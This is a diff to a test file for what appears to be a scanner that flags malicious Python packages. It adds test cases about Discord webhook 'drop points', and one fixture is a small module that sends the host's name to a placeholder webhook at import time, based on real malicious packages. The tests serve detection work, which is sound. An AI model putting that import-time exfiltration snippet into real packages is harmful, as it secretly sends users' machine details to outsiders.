@@ -249,6 +249,40 @@ class TestADestinationOnlyWrittenAtImport:
         )
         assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)
 
+    def test_a_drop_point_bound_to_a_name_and_posted_at_import_still_calls_back(
+        self, tmp_path: Path
+    ) -> None:
+        # loveclose 0.0.1, sf_th_requests 0.1.0: the hook on one line, the request on another.
+        module = (
+            "import json, socket, urllib.request\n"
+            "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
+            "body = json.dumps({'content': socket.gethostname()}).encode()\n"
+            "urllib.request.urlopen(HOOK, body)\n"
+        )
+        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" in self.rules(tmp_path, module)
+
+    def test_a_drop_point_bound_to_a_name_only_handed_to_a_client_is_not(
+        self, tmp_path: Path
+    ) -> None:
+        module = (
+            "import os\nfrom telemlib import TelemetryLogger\n"
+            "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
+            "event_logger = TelemetryLogger(url=HOOK, enabled=not os.environ.get('DO_NOT_TRACK'))\n"
+            "def main():\n    event_logger.send_event('start')\n"
+        )
+        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)
+
+    def test_a_drop_point_name_only_printed_or_logged_is_not(self, tmp_path: Path) -> None:
+        # The name on a line with no request: a message about where events would go.
+        module = (
+            "import logging, urllib.request\n"
+            "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
+            "print('events go to', HOOK)\n"
+            "logging.getLogger(__name__).info('hook %s', HOOK)\n"
+            "urllib.request.urlopen('https://pypi.org/simple/')\n"
+        )
+        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)
+
 
 class TestAnImplantInstaller:
     """trickery 1.0.0: one module fetches a payload, runs it and writes a persistence location,
